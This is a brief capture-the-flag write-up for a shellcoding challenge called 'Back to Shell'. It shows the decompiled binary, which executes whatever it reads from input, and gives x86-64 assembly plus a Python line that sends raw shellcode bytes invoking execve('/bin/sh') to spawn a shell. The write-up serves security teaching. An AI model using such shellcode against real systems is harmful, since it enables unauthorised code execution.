# Back to Shell

**Category:** Shellcoding

## Overview
```text
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = mmap(0, 4096, 7, 34, -1, 0);
  read(0, v4, 512);
  __asm { jmp     rax }
  return result;
}
```

## Analysis
The binary creates a new mapping in the virtual memory and reads 512 bytes from input.
Then the assembly inside is executed by jumping to the address in rax (the address of the created mmap).

## Vulnerability
This is a classic shellcode challenge, we have to create one to spawn a shell.

## Exploitation
The shellcode used is the following:

```text
xor    rdi,rdi  
mov    rdi,rax      in rax there is the input, I move it into rdi to set the arg of execve 
add    rdi,0x16     I add 0x16 (22) to reach /bin/sh\x00, so rdi points to it as arg of execve
xor    rax,rax
mov    rax,0x3b
syscall
```
The final shellcode is the compiled version of the given one with `/bin/sh\0` appended at the end.

```python
r.sendline(b"\x48\x31\xFF\x48\x89\xC7\x48\x83\xC7\x16\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0")
```

